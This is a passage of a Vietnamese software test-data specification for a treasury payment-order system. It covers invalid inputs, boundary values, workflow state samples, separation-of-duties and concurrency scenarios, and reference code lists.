| `INV-93` | LNH_TRANSACTION_TYPE khi LNH nhung NULL   | `LNH`          | `NULL`               | Co the cho phep hoac require tuy logic (check spec) | `MSG-ERR-REQUIRED` |

### 3.9. ORDER_TYPE thieu khi channel LNH / TTSP

| Ma TC     | Mo ta                                  | CHANNEL        | ORDER_TYPE          | Loi mong doi                        | Message code       |
| --------- | -------------------------------------- | -------------- | ------------------- | ----------------------------------- | ------------------ |
| `INV-100` | ORDER_TYPE NULL khi channel LNH        | `LNH`          | `NULL`              | DB reject (CK: ORDER_TYPE required) | `MSG-ERR-REQUIRED` |
| `INV-101` | ORDER_TYPE NULL khi channel TTSP       | `TTSP`         | `NULL`              | DB reject (CK: ORDER_TYPE required) | `MSG-ERR-REQUIRED` |
| `INV-102` | ORDER_TYPE co gia tri khi LIEN_KHO_BAC | `LIEN_KHO_BAC` | `LENH_THONG_THUONG` | DB reject (CK: phai NULL)           | `MSG-ERR-LOOKUP`   |

### 3.10. To hop COA segment khong hop le (CCID vi pham)

| Ma TC     | Mo ta                                   | Segment vi pham             | Gia tri          | Loi mong doi      | Message code   |
| --------- | --------------------------------------- | --------------------------- | ---------------- | ----------------- | -------------- |
| `INV-110` | TK tu nhien khong ton tai               | `GL_SEGMENT2`               | `9999`           | Highlight do dong | `MSG-ERR-CCID` |
| `INV-111` | DVQHNS khong ton tai                    | `GL_SEGMENT3`               | `0000000`        | Highlight do dong | `MSG-ERR-CCID` |
| `INV-112` | To hop segment khong ton tai trong CCID | `GL_SEGMENT2`+`GL_SEGMENT3` | `1111`+`9999999` | Highlight do dong | `MSG-ERR-CCID` |
| `INV-113` | Ma quy khong hop le                     | `GL_SEGMENT1`               | `99`             | Highlight do dong | `MSG-ERR-CCID` |

### 3.11. IDENTIFY dieu kien — thieu ISSUED_DATE hoac ISSUED_PLACE

| Ma TC     | Mo ta                                          | Truong co                         | Truong thieu                                                  | Loi mong doi   | Message code          |
| --------- | ---------------------------------------------- | --------------------------------- | ------------------------------------------------------------- | -------------- | --------------------- |
| `INV-120` | SENDER co IDENTIFY_ID nhung thieu ISSUED_DATE  | `SENDER_IDENTIFY_ID` = `001234`   | `SENDER_ISSUED_DATE` = NULL                                   | DB reject (CK) | `MSG-ERR-CROSS-FIELD` |
| `INV-121` | SENDER co IDENTIFY_ID nhung thieu ISSUED_PLACE | `SENDER_IDENTIFY_ID` = `001234`   | `SENDER_ISSUED_PLACE` = NULL                                  | DB reject (CK) | `MSG-ERR-CROSS-FIELD` |
| `INV-122` | RECEIVER co IDENTIFY_ID nhung thieu ca hai     | `RECEIVER_IDENTIFY_ID` = `009876` | `RECEIVER_ISSUED_DATE` = NULL, `RECEIVER_ISSUED_PLACE` = NULL | DB reject (CK) | `MSG-ERR-CROSS-FIELD` |

### 3.12. REF_NO trung (VAL-11)

| Ma TC     | Mo ta                               | REF_NO gui len       | Du lieu co san                  | Loi mong doi       | Message code        |
| --------- | ----------------------------------- | -------------------- | ------------------------------- | ------------------ | ------------------- |
| `INV-130` | REF_NO trung trong cung ky + don vi | `KBHN-202605-000001` | Da ton tai order voi REF_NO nay | Chan submit        | `MSG-ERR-DUPLICATE` |
| `INV-131` | REF_NO trung nhung khac ky (hop le) | `KBHN-202604-000001` | Ton tai nhung ky 04/2026        | Cho phep (khac ky) | —                   |

---

## 4. Gia tri bien (Boundary Values)

### 4.1. AMOUNT — bien tren/duoi

| Ma TC    | Mo ta                        | Gia tri              | Ket qua mong doi                       |
| -------- | ---------------------------- | -------------------- | -------------------------------------- |
| `BND-01` | AMOUNT toi thieu (> 0)       | `0.01`               | Hop le — luu thanh cong                |
| `BND-02` | AMOUNT toi da                | `99999999999999.99`  | Hop le — luu thanh cong (NUMBER(18,2)) |
| `BND-03` | AMOUNT = 0                   | `0.00`               | Loi — CK constraint AMOUNT > 0         |
| `BND-04` | AMOUNT am                    | `-0.01`              | Loi — CK constraint AMOUNT > 0         |
| `BND-05` | AMOUNT vuot max NUMBER(18,2) | `100000000000000.00` | Loi — overflow DB                      |
| `BND-06` | LINE_AMOUNT toi thieu        | `0.01`               | Hop le                                 |
| `BND-07` | LINE_AMOUNT toi da           | `99999999999999.99`  | Hop le                                 |
| `BND-08` | LINE_AMOUNT = 0              | `0.00`               | Loi — CK constraint LINE_AMOUNT > 0    |
| `BND-09` | LINE_AMOUNT am               | `-100.00`            | Loi — CK constraint LINE_AMOUNT > 0    |

### 4.2. String fields — do dai toi da

| Ma TC    | Truong                  | Max length | Gia tri test (hop le)                       | Gia tri test (vuot)                      |
| -------- | ----------------------- | ---------- | ------------------------------------------- | ---------------------------------------- |
| `BND-10` | `REF_NO`                | 20 CHAR    | `KBHN-202605-000001` (18 ky tu) — hop le    | `12345678901234567890X` (21 ky tu) — loi |
| `BND-11` | `DESCRIPTION`           | 500 CHAR   | String 500 ky tu chinh xac — hop le         | String 501 ky tu — loi                   |
| `BND-12` | `SENDER_NAME`           | 200 CHAR   | String 200 ky tu — hop le                   | String 201 ky tu — loi                   |
| `BND-13` | `SENDER_ADDRESS`        | 500 CHAR   | String 500 ky tu — hop le                   | String 501 ky tu — loi                   |
| `BND-14` | `RECEIVER_NAME`         | 200 CHAR   | String 200 ky tu — hop le                   | String 201 ky tu — loi                   |
| `BND-15` | `RECEIVER_ADDRESS`      | 500 CHAR   | `NULL` (khong bat buoc) — hop le            | String 501 ky tu — loi                   |
| `BND-16` | `RECEIVER_ACCOUNT_NAME` | 200 CHAR   | String 200 ky tu — hop le                   | String 201 ky tu — loi                   |
| `BND-17` | `SENDER_IDENTIFY_ID`    | 50 CHAR    | `001234567890` — hop le                     | String 51 ky tu — loi                    |
| `BND-18` | `SENDER_ISSUED_PLACE`   | 200 CHAR   | String 200 ky tu — hop le                   | String 201 ky tu — loi                   |
| `BND-19` | `ORIGIN_NUM`            | 50 CHAR    | `CT-2026-05-0000000001` (19 ky tu) — hop le | String 51 ky tu — loi                    |
| `BND-20` | `DELETE_REASON`         | 500 CHAR   | String 500 ky tu — hop le (max)             | String 501 ky tu — loi                   |
| `BND-21` | `CHECKER_COMMENT`       | 500 CHAR   | String 500 ky tu — hop le                   | String 501 ky tu — loi                   |
| `BND-22` | `LINE_DESCRIPTION`      | 500 CHAR   | String 500 ky tu — hop le                   | String 501 ky tu — loi                   |
| `BND-23` | `SENDER`                | 20 CHAR    | `BANK_001` (8 ky tu) — hop le               | String 21 ky tu — loi                    |
| `BND-24` | `RECEIVER`              | 20 CHAR    | `BANK_002` (8 ky tu) — hop le               | String 21 ky tu — loi                    |
| `BND-25` | `KBNN_ID`               | 10 CHAR    | `KBHN` (4 ky tu) — hop le                   | String 11 ky tu — loi                    |

### 4.3. IDENTIFY — co/khong co ISSUED_DATE va ISSUED_PLACE

| Ma TC    | Mo ta                                          | SENDER_IDENTIFY_ID | SENDER_ISSUED_DATE | SENDER_ISSUED_PLACE | Ket qua  |
| -------- | ---------------------------------------------- | ------------------ | ------------------ | ------------------- | -------- |
| `BND-30` | Khong nhap IDENTIFY_ID (ca 3 NULL)             | `NULL`             | `NULL`             | `NULL`              | Hop le   |
| `BND-31` | Co IDENTIFY_ID + du ISSUED_DATE + ISSUED_PLACE | `001234567890`     | `2020-01-15`       | `CA TP Ha Noi`      | Hop le   |
| `BND-32` | Co IDENTIFY_ID nhung thieu ISSUED_DATE         | `001234567890`     | `NULL`             | `CA TP Ha Noi`      | Loi (CK) |
| `BND-33` | Co IDENTIFY_ID nhung thieu ISSUED_PLACE        | `001234567890`     | `2020-01-15`       | `NULL`              | Loi (CK) |
| `BND-34` | Co IDENTIFY_ID nhung thieu ca hai              | `001234567890`     | `NULL`             | `NULL`              | Loi (CK) |

> Tuong tu cho `RECEIVER_IDENTIFY_ID`, `RECEIVER_ISSUED_DATE`, `RECEIVER_ISSUED_PLACE`.

### 4.4. Attachment — kich thuoc va dinh dang

| Ma TC    | Mo ta                           | FILE_SIZE  | Extension | CONTENT_TYPE                                                              | Ket qua                          |
| -------- | ------------------------------- | ---------- | --------- | ------------------------------------------------------------------------- | -------------------------------- |
| `BND-40` | File dung limit (10MB - 1 byte) | `10485759` | `.pdf`    | `application/pdf`                                                         | Hop le                           |
| `BND-41` | File vua du 10MB                | `10485760` | `.pdf`    | `application/pdf`                                                         | Hop le (CK: <= 10485760)         |
| `BND-42` | File vuot 10MB (10MB + 1 byte)  | `10485761` | `.pdf`    | `application/pdf`                                                         | Loi — `MSG-ERR-FILE`             |
| `BND-43` | File vuot nhieu (15MB)          | `15728640` | `.pdf`    | `application/pdf`                                                         | Loi — `MSG-ERR-FILE`             |
| `BND-44` | File size = 0                   | `0`        | `.pdf`    | `application/pdf`                                                         | Loi — CK: FILE_SIZE > 0          |
| `BND-45` | Dinh dang PDF                   | `1024000`  | `.pdf`    | `application/pdf`                                                         | Hop le                           |
| `BND-46` | Dinh dang JPG                   | `2048000`  | `.jpg`    | `image/jpeg`                                                              | Hop le                           |
| `BND-47` | Dinh dang PNG                   | `3072000`  | `.png`    | `image/png`                                                               | Hop le                           |
| `BND-48` | Dinh dang DOCX                  | `1024000`  | `.docx`   | `application/vnd.openxmlformats-officedocument.wordprocessingml.document` | Hop le                           |
| `BND-49` | Dinh dang XLSX                  | `1024000`  | `.xlsx`   | `application/vnd.openxmlformats-officedocument.spreadsheetml.sheet`       | Hop le                           |
| `BND-50` | Dinh dang EXE (chan)            | `500000`   | `.exe`    | `application/x-msdownload`                                                | Loi — `MSG-ERR-FILE`             |
| `BND-51` | Dinh dang ZIP (chan)            | `5000000`  | `.zip`    | `application/zip`                                                         | Loi — `MSG-ERR-FILE`             |
| `BND-52` | Dinh dang BAT (chan)            | `100`      | `.bat`    | `application/bat`                                                         | Loi — `MSG-ERR-FILE`             |
| `BND-53` | Dinh dang COM (chan)            | `100`      | `.com`    | `application/octet-stream`                                                | Loi — `MSG-ERR-FILE`             |
| `BND-54` | MIME type khong khop extension  | `1024000`  | `.pdf`    | `image/jpeg`                                                              | Loi — kiem tra magic byte / MIME |

### 4.5. Lines — so luong dong

| Ma TC    | Mo ta                      | So dong | LINE_AMOUNT moi dong         | SUM → AMOUNT          | Ket qua                     |
| -------- | -------------------------- | ------- | ---------------------------- | --------------------- | --------------------------- |
| `BND-60` | 1 dong duy nhat            | 1       | `1000000.00`                 | `1000000.00`          | Hop le                      |
| `BND-61` | Nhieu dong (10)            | 10      | Moi dong `100000.00`         | `1000000.00`          | Hop le                      |
| `BND-62` | Dong co LINE_AMOUNT = 0.01 | 1       | `0.01`                       | `0.01`                | Hop le                      |
| `BND-63` | 0 dong (khong co line)     | 0       | —                            | AMOUNT = `1000000.00` | Loi mismatch                |
| `BND-64` | 2 dong voi LINE_AMOUNT max | 2       | `99999999999999.99` moi dong | `199999999999999.98`  | Vuot NUMBER(18,2)? can test |

### 4.6. EXCHANGE_RATE — bien

| Ma TC    | Mo ta                   | CURRENCY_CODE | EXCHANGE_RATE       | Ket qua                |
| -------- | ----------------------- | ------------- | ------------------- | ---------------------- |
| `BND-70` | VND, EXCHANGE_RATE NULL | `VND`         | `NULL`              | Hop le (CK constraint) |
| `BND-71` | USD, ty gia toi thieu   | `USD`         | `0.000001`          | Hop le (> 0)           |
| `BND-72` | EUR, ty gia lon         | `EUR`         | `9999999999.999999` | Hop le (NUMBER(18,6))  |
| `BND-73` | USD, ty gia = 0         | `USD`         | `0`                 | Loi (CK: > 0)          |
| `BND-74` | USD, ty gia am          | `USD`         | `-1`                | Loi (CK: > 0)          |

### 4.7. VERSION — optimistic lock

| Ma TC    | Mo ta                         | VERSION trong DB | If-Match header | Ket qua                  |
| -------- | ----------------------------- | ---------------- | --------------- | ------------------------ |
| `BND-80` | VERSION khop, luu thanh cong  | `3`              | `"3"`           | Thanh cong, VERSION -> 4 |
| `BND-81` | VERSION lech (da bi sua)      | `3`              | `"2"`           | Loi 409 — `MSG-ERR-LOCK` |
| `BND-82` | VERSION = 1, lan luu dau tien | `1`              | `"1"`           | Thanh cong, VERSION -> 2 |
| `BND-83` | Khong gui If-Match            | `3`              | (thieu)         | Loi 400 — header bat buo |
| `BND-84` | VERSION = 0 (khong hop le)    | `1`              | `"0"`           | Loi 409 — `MSG-ERR-LOCK` |

---

## 5. Du lieu Chuyen trang thai (State Transition Test Data)

### 5.1. Lenh o moi trang thai

Duoi day la cac ban ghi sample o moi trang thai, san sang cho test lien quan den workflow.

#### Lenh DRAFT (trang thai khoi tao)

| Truong          | Gia tri              |
| --------------- | -------------------- |
| `ID`            | `st-draft-0001`      |
| `VERSION`       | `1`                  |
| `STATUS`        | `DRAFT`              |
| `REF_NO`        | `KBHN-202605-001001` |
| `CHANNEL`       | `LNH`                |
| `ORDER_TYPE`    | `LENH_CHUYEN_KHOAN`  |
| `AMOUNT`        | `100000000.00`       |
| `CURRENCY_CODE` | `VND`                |
| `CREATED_BY`    | `USR-MAKER-001`      |
| `CHECKER_ID`    | `NULL`               |
| `APPROVER_ID`   | `NULL`               |
| `KBNN_ID`       | `KBHN`               |

#### Lenh READY_FOR_APPROVAL (da submit)

| Truong          | Gia tri              |
| --------------- | -------------------- |
| `ID`            | `st-rfa-0002`        |
| `VERSION`       | `2`                  |
| `STATUS`        | `READY_FOR_APPROVAL` |
| `REF_NO`        | `KBHN-202605-001002` |
| `CHANNEL`       | `LNH`                |
| `ORDER_TYPE`    | `LENH_CHUYEN_KHOAN`  |
| `AMOUNT`        | `200000000.00`       |
| `CURRENCY_CODE` | `VND`                |
| `CREATED_BY`    | `USR-MAKER-001`      |
| `CHECKER_ID`    | `NULL`               |
| `APPROVER_ID`   | `NULL`               |
| `KBNN_ID`       | `KBHN`               |

#### Lenh PENDING_APPROVER (Checker da duyet)

| Truong              | Gia tri                                   |
| ------------------- | ----------------------------------------- |
| `ID`                | `st-pa-0003`                              |
| `VERSION`           | `3`                                       |
| `STATUS`            | `PENDING_APPROVER`                        |
| `REF_NO`            | `KBHN-202605-001003`                      |
| `CHANNEL`           | `LNH`                                     |
| `ORDER_TYPE`        | `LENH_CHUYEN_KHOAN`                       |
| `AMOUNT`            | `300000000.00`                            |
| `CURRENCY_CODE`     | `VND`                                     |
| `CREATED_BY`        | `USR-MAKER-001`                           |
| `CHECKER_ID`        | `USR-CHK-001`                             |
| `CHECKER_ACTION_AT` | `2026-05-19T11:00:00+07:00`               |
| `CHECKER_COMMENT`   | `NULL` (check-approve, khong can comment) |
| `APPROVER_ID`       | `NULL`                                    |
| `KBNN_ID`           | `KBHN`                                    |

#### Lenh APPROVED (Approver da duyet cuoi)

| Truong               | Gia tri                     |
| -------------------- | --------------------------- |
| `ID`                 | `st-apr-0004`               |
| `VERSION`            | `4`                         |
| `STATUS`             | `APPROVED`                  |
| `REF_NO`             | `KBHN-202605-001004`        |
| `CHANNEL`            | `LNH`                       |
| `ORDER_TYPE`         | `LENH_CHUYEN_KHOAN`         |
| `AMOUNT`             | `500000000.00`              |
| `CURRENCY_CODE`      | `VND`                       |
| `CREATED_BY`         | `USR-MAKER-001`             |
| `CHECKER_ID`         | `USR-CHK-001`               |
| `CHECKER_ACTION_AT`  | `2026-05-19T11:00:00+07:00` |
| `APPROVER_ID`        | `USR-APR-001`               |
| `APPROVER_ACTION_AT` | `2026-05-19T14:30:00+07:00` |
| `APPROVER_COMMENT`   | `NULL`                      |
| `KBNN_ID`            | `KBHN`                      |

#### Lenh RETURNED_TO_MAKER (Checker tra lai)

| Truong              | Gia tri                                          |
| ------------------- | ------------------------------------------------ |
| `ID`                | `st-ret-0005`                                    |
| `VERSION`           | `3`                                              |
| `STATUS`            | `RETURNED_TO_MAKER`                              |
| `REF_NO`            | `KBHN-202605-001005`                             |
| `CHANNEL`           | `LNH`                                            |
| `ORDER_TYPE`        | `LENH_CHUYEN_KHOAN`                              |
| `AMOUNT`            | `150000000.00`                                   |
| `CURRENCY_CODE`     | `VND`                                            |
| `CREATED_BY`        | `USR-MAKER-001`                                  |
| `CHECKER_ID`        | `USR-CHK-001`                                    |
| `CHECKER_ACTION_AT` | `2026-05-19T11:15:00+07:00`                      |
| `CHECKER_COMMENT`   | `Sai thong tin nguoi nhan, yeu cau kiem tra lai` |
| `APPROVER_ID`       | `NULL`                                           |
| `KBNN_ID`           | `KBHN`                                           |

#### Lenh REJECTED (Checker tu choi)

| Truong              | Gia tri                                               |
| ------------------- | ----------------------------------------------------- |
| `ID`                | `st-rej-0006`                                         |
| `VERSION`           | `3`                                                   |
| `STATUS`            | `REJECTED`                                            |
| `REF_NO`            | `KBHN-202605-001006`                                  |
| `CHANNEL`           | `LNH`                                                 |
| `ORDER_TYPE`        | `LENH_CHUYEN_KHOAN`                                   |
| `AMOUNT`            | `80000000.00`                                         |
| `CURRENCY_CODE`     | `VND`                                                 |
| `CREATED_BY`        | `USR-MAKER-001`                                       |
| `CHECKER_ID`        | `USR-CHK-001`                                         |
| `CHECKER_ACTION_AT` | `2026-05-19T11:30:00+07:00`                           |
| `CHECKER_COMMENT`   | `Chung tu khong hop le, khong du dieu kien phe duyet` |
| `APPROVER_ID`       | `NULL`                                                |
| `KBNN_ID`           | `KBHN`                                                |

#### Lenh DELETED (Soft delete boi Maker)

| Truong          | Gia tri                                           |
| --------------- | ------------------------------------------------- |
| `ID`            | `st-del-0007`                                     |
| `VERSION`       | `2`                                               |
| `STATUS`        | `DELETED`                                         |
| `REF_NO`        | `KBHN-202605-001007`                              |
| `CHANNEL`       | `LNH`                                             |
| `ORDER_TYPE`    | `LENH_CHUYEN_KHOAN`                               |
| `AMOUNT`        | `10000000.00`                                     |
| `CURRENCY_CODE` | `VND`                                             |
| `CREATED_BY`    | `USR-MAKER-001`                                   |
| `DELETE_REASON` | `Lenh lap nham do sai doi tuong, can lap lai moi` |
| `DELETED_BY`    | `USR-MAKER-001`                                   |
| `DELETED_AT`    | `2026-05-19T16:00:00+07:00`                       |
| `DELETED_IP`    | `10.0.1.100`                                      |
| `KBNN_ID`       | `KBHN`                                            |

### 5.2. Canh bao SoD (SoD Violation Scenarios)

| Ma TC    | Mo ta                                                     | CREATED_BY      | CHECKER_ID (thu set) | APPROVER_ID (thu set) | Loi mong doi                                                         |
| -------- | --------------------------------------------------------- | --------------- | -------------------- | --------------------- | -------------------------------------------------------------------- |
| `SOD-01` | Maker cung la Checker cho chinh lenh do                   | `USR-MAKER-001` | `USR-MAKER-001`      | —                     | DB reject (CK: checker_id <> created_by) + 403 `MSG-ERR-PERMISSION`  |
| `SOD-02` | Maker cung la Approver cho chinh lenh do                  | `USR-MAKER-001` | `USR-CHK-001`        | `USR-MAKER-001`       | DB reject (CK: approver_id <> created_by) + 403 `MSG-ERR-PERMISSION` |
| `SOD-03` | Checker cung la Approver                                  | `USR-MAKER-001` | `USR-CHK-001`        | `USR-CHK-001`         | DB reject (CK: approver_id <> checker_id) + 403 `MSG-ERR-PERMISSION` |
| `SOD-04` | User multi-role co MAKRER+CHECKER thu check               | `USR-MIX-001`   | `USR-MIX-001`        | —                     | App guard phat hien, chan (dung userId, khong phai role)             |
| `SOD-05` | 3 user khac nhau — hop le SoD                             | `USR-MAKER-001` | `USR-CHK-001`        | `USR-APR-001`         | Hop le — cho phep                                                    |
| `SOD-06` | Maker_02 thu sua lenh cua Maker_01 (khong phai Maker goc) | `USR-MAKER-001` | —                    | —                     | App chan (VAL-14: chi Maker goc) `MSG-ERR-MAKER`                     |

### 5.3. Xung dot Optimistic Lock (Concurrency Scenarios)

| Ma TC    | Mo ta                                    | User A          | User B          | VERSION_A            | VERSION_B | Ket qua                            |
| -------- | ---------------------------------------- | --------------- | --------------- | -------------------- | --------- | ---------------------------------- |
| `OCK-01` | User A sua thanh cong, User B sua bi loi | `USR-MAKER-001` | `USR-MAKER-002` | `2`                  | `2`       | A: OK -> v3. B: 409 `MSG-ERR-LOCK` |
| `OCK-02` | User A sua lan 2 nhanh hon User B        | `USR-MAKER-001` | `USR-MAKER-001` | `3`                  | `3`       | Lan 1: OK -> v4. Lan 2: 409        |
| `OCK-03` | Maker sua + Checker check dong thoi      | `USR-MAKER-001` | `USR-CHK-001`   | `2`                  | `2`       | Maker save OK -> v3. Checker: 409  |
| `OCK-04` | Submit khi version da thay doi           | `USR-MAKER-001` | —               | If-Match=`2`, DB=`3` | —         | 409 `MSG-ERR-LOCK`                 |
| `OCK-05` | Delete khi version da thay doi           | `USR-MAKER-001` | —               | If-Match=`1`, DB=`5` | —         | 409 `MSG-ERR-LOCK`                 |

---

## 6. Du lieu tham chieu (Reference Data)

### 6.1. Ngan hang / KB (Banks)

| Ma (BANK_CODE) | Ten ngan hang                                | Ma chi nhanh | Ten chi nhanh    | Loai       |
| -------------- | -------------------------------------------- | ------------ | ---------------- | ---------- |
| `BANK_001`     | Ngan hang Dau tu Phat trien VN (BIDV)        | `CN-HN-001`  | Chi nhanh Ha Noi | Thuong mai |
| `BANK_002`     | Ngan hang Ngoai thuong Vietcombank           | `CN-HN-002`  | Chi nhanh Ha Noi | Thuong mai |
| `BANK_003`     | Ngan hang Nha nuoc Viet Nam                  | `CN-HN-003`  | Chi nhanh Ha Noi | Nha nuoc   |
| `BANK_004`     | Ngan hang Phat trien Viet Nam (VDB)          | `CN-HN-004`  | Chi nhanh Ha Noi | Phat trien |
| `BANK_005`     | Ngan hang Thuong mai Co phan Ky Thuong (KLB) | `CN-HCM-001` | Chi nhanh TP HCM | Thuong mai |

### 6.2. Ma DVQHNS (Don vi Quan he Nguon sach)

| Ma DVQHNS | Ten don vi                          | Cap        | Thuoc KBNN |
| --------- | ----------------------------------- | ---------- | ---------- |
| `1000001` | KBNN Quan Ba Dinh - Ha Noi          | Quan/Huyen | KBHN       |
| `1000002` | KBNN Quan Hoan Kiem - Ha Noi        | Quan/Huyen | KBHN       |
| `1000003` | KBNN Quan Cau Giay - Ha Noi         | Quan/Huyen | KBHN       |
| `7000001` | KBNN Quan 1 - TP Ho Chi Minh        | Quan/Huyen | KBHCM      |
| `7000002` | KBNN Quan 3 - TP Ho Chi Minh        | Quan/Huyen | KBHCM      |
| `9999999` | (Khong hop le — dung test negative) | —          | —          |

### 6.3. Loai tien (Currencies)

| Ma (CURRENCY_CODE) | Ten loai tien | Ky hieu | Su dung trong test                  |
| ------------------ | ------------- | ------- | ----------------------------------- |
| `VND`              | Dong Viet Nam | d       | Mac dinh, khong can EXCHANGE_RATE   |
| `USD`              | Dong My       | $       | Ngoai te — bat buoc EXCHANGE_RATE   |
| `EUR`              | Dong Euro     | E       | Ngoai te — bat buoc EXCHANGE_RATE   |
| `JPY`              | Yen Nhat      | Y       | Ngoai te — test them loai tien khac |
| `GBP`              | Bang Anh      | L       | Ngoai te — test them                |

### 6.4. To hop COA hop le (Valid CCID Segment Combinations)

> Day la cac to hop segment duoc gioi han trong DMHT_COA_MATRIX. Moi to hop dai dien cho 1 CCID hop le.

| CCID Key                                                    | GL_SEGMENT1 | GL_SEGMENT2 | GL_SEGMENT3 | GL_SEGMENT4 | GL_SEGMENT5 | Mo ta               |
| ----------------------------------------------------------- | ----------- | ----------- | ----------- | ----------- | ----------- | ------------------- |
| `01-1111-1000001-01-000-000-0000-00000-00000-00-0000-000`   | `01`        | `1111`      | `1000001`   | `01`        | `000`       | TK chi thuong xuyen |
| `01-1121-1000001-01-000-000-0000-00000-00000-00-0000-000`   | `01`        | `1121`      | `1000001`   | `01`        | `000`       | TK chi khac         |
| `01-2411-1000001-NULL-000-000-3110-00001-00000-00-0000-000` | `01`        | `2411`      | `1000001`   | `NULL`      | `000`       | TK phi dich vu      |
| `01-3333-1000001-02-000-000-0000-00000-00000-00-0000-000`   | `01`        | `3333`      | `1000001`   | `02`        | `000`       | TK chuyen TPCP      |
| `01-1111-1000002-01-000-000-0000-00000-00000-00-0000-000`   | `01`        | `1111`      | `1000002`   | `01`        | `000`       | TK khac DVQHNS      |
| `01-4444-7000001-01-000-000-0000-00000-00000-00-0000-000`   | `01`        | `4444`      | `7000001`   | `01`        | `000`       | TK KBHCM            |

### 6.5. To hop COA khong hop le (Invalid CCID — dung test VAL-19)

| CCID Key                                                  | Ly do khong hop le               |
| --------------------------------------------------------- | -------------------------------- |
| `01-9999-1000001-01-000-000-0000-00000-00000-00-0000-000` | TK tu nhien `9999` khong ton tai |
| `01-1111-0000000-01-000-000-0000-00000-00000-00-0000-000` | DVQHNS `0000000` khong ton tai   |
| `01-1111-1000001-99-000-000-0000-00000-00000-00-0000-000` | Cap NS `99` khong hop le         |
| `99-1111-1000001-01-000-000-0000-00000-00000-00-0000-000` | Ma quy `99` khong ton tai        |
| `01-1111-9999999-01-000-000-0000-00000-00000-00-0000-000` | DVQHNS `9999999` khong ton tai   |

### 6.6. Danh muc LOV (List of Values)

#### LOV.01 — Channel

| Code           | Ten hien thi (VN)      |
| -------------- | ---------------------- |
| `LNH`          | Lien ngan hang         |
| `TTSP`         | Thanh toan song phuong |
| `LIEN_KHO_BAC` | Lien kho bac           |

#### LOV.01 — Channel_Type (ORDER_TYPE theo Channel)

| Channel        | Code ORDER_TYPE              | Ten hien thi (VN)             |
| -------------- | ---------------------------- | ----------------------------- |
| `LNH`          | `LENH_CHUYEN_KHOAN`          | Lenh chuyen khoan             |
| `LNH`          | `LENH_CHI_TM_KBNN`           | Lenh chi tien mat cho KBNN    |
| `LNH`          | `LENH_CHI_TM_KH`             | Lenh chi tien mat cho KH      |
| `LNH`          | `TT_BANG_NGOAI_TE_KHAC`      | Thanh toan bang ngoai te khac |
| `TTSP`         | `LENH_THONG_THUONG`          | Lenh thong thuong             |
| `TTSP`         | `LENH_TRAI_PHIEU_CP`         | Lenh trai phieu chinh phu     |
| `TTSP`         | `LENH_CO_TT_NSNN`            | Lenh co thong tin thu NSNN    |
| `LIEN_KHO_BAC` | (NULL — khong co ORDER_TYPE) | —                             |

#### LOV.04 — Currency_Code

| Code  | Ten hien thi  |
| ----- | ------------- |
| `VND` | Dong Viet Nam |
| `USD` | Dong My       |
| `EUR` | Dong Euro     |
| `JPY` | Yen Nhat      |
| `GBP` | Bang Anh      |

#### LOV.05 — Expense_Code (EXP_TYPE)

| Code    | Ten hien thi    |
| ------- | --------------- |
| `EXP01` | Phi giao dich   |
| `EXP02` | Phi chuyen tien |
| `EXP03` | Phi ngan hang   |
| `EXP04` | Phi dich vu     |
| `EXP05` | Chi phi khac    |

#### LOV.06 — Payment_Type_Code (LNH_TRANSACTION_TYPE)

| Code    | Ten hien thi (VN)           | Ap dung              |
| ------- | --------------------------- | -------------------- |
| `LTT01` | Lenh chuyen No gia tri thap | LNH, AMOUNT < 500tr  |
| `LTT02` | Lenh chuyen No gia tri cao  | LNH, AMOUNT >= 500tr |
| `LTT03` | Lenh chuyen Co gia tri thap | LNH, AMOUNT < 500tr  |
| `LTT04` | Lenh chuyen Co gia tri cao  | LNH, AMOUNT >= 500tr |

#### LOV.07 — Segment_Code (COA — 12 segments)

| Segment        | Ma          | Do dai | Bat buoc | Default | Vi du                                  |
| -------------- | ----------- | ------ | -------- | ------- | -------------------------------------- |
| `GL_SEGMENT1`  | Ma quy      | 2      | N        | `01`    | `01`                                   |
| `GL_SEGMENT2`  | TK tu nhien | 4      | Y        | —       | `1111`, `1121`, `2411`, `3333`, `4444` |
| `GL_SEGMENT3`  | DVQHNS      | 7      | Y        | —       | `1000001`, `1000002`, `7000001`        |
| `GL_SEGMENT4`  | Cap NS      | 1      | C        | —       | `01`, `02`                             |
| `GL_SEGMENT5`  | Chuong      | 3      | C        | `000`   | `000`                                  |
| `GL_SEGMENT6`  | Nganh KT    | 3      | C        | `000`   | `000`                                  |
| `GL_SEGMENT7`  | NDKT        | 4      | C        | `0000`  | `0000`, `3110`                         |
| `GL_SEGMENT8`  | Dia ban     | 5      | C        | `00000` | `00000`, `00001`                       |
| `GL_SEGMENT9`  | CTMT        | 5      | C        | `00000` | `00000`                                |
| `GL_SEGMENT10` | MN          | 2      | C        | `00`    | `00`                                   |
| `GL_SEGMENT11` | Kho bac     | 4      | C        | `0000`  | `0000`                                 |
| `GL_SEGMENT12` | DP          | 3      | C        | `000`   | `000`                                  |

### 6.7. Ma KBNN (Kho bac nha nuoc)

| Ma KBNN | Ten KBNN                        | Thanh pho      |
| ------- | ------------------------------- | -------------- |
| `KBHN`  | Kho Bac Nha Nuoc TP Ha Noi      | Ha Noi         |
| `KBHCM` | Kho Bac Nha Nuoc TP Ho Chi Minh | TP Ho Chi Minh |
| `KBDN`  | Kho Bac Nha Nuoc TP Da Nang     | Da Nang        |

### 6.8. DOC_TYPE (Loai chung tu dinh kem)

| Code           | Ten hien thi (VN) |
| -------------- | ----------------- |
| `CHUNG_TU_GOC` | Chung tu goc      |
| `HOP_DONG`     | Hop dong          |
| `HOA_DON`      | Hoa don           |
| `BANG_KE`      | Bang ke           |
| `VAN_BAN_KHAC` | Van ban khac      |

---

## 7. Du lieu phu tro (Auxiliary Test Scenarios)

### 7.1. Idempotency test data

| Ma TC    | Mo ta                          | IDEMPOTENCY_KEY (lan 1) | IDEMPOTENCY_KEY (lan 2) | Request Body       | Ket qua mong doi                  |
| -------- | ------------------------------ | ----------------------- | ----------------------- | ------------------ | --------------------------------- |
| `IDM-01` | Gui 2 lan cung key + cung body | `idem-test-001`         | `idem-test-001`         | Giong nhau         | Tra lai ket qua lan 1 (cache hit) |
| `IDM-02` | Gui 2 lan cung key + khac body | `idem-test-002`         | `idem-test-002`         | Khac nhau (amount) | Lan 2: 422 Unprocessable Entity   |
| `IDM-03` | Gui lan dau tien (key moi)     | `idem-test-003`         | —                       | —                  | Thanh cong 201                    |
| `IDM-04` | Key da het TTL (>24h)          | `idem-test-old`         | `idem-test-old`         | Giong nhau         | Xu ly nhu key moi (da cleanup)    |

### 7.2. Canh bao trung giao dich (Duplicate Detection — VAL-18)

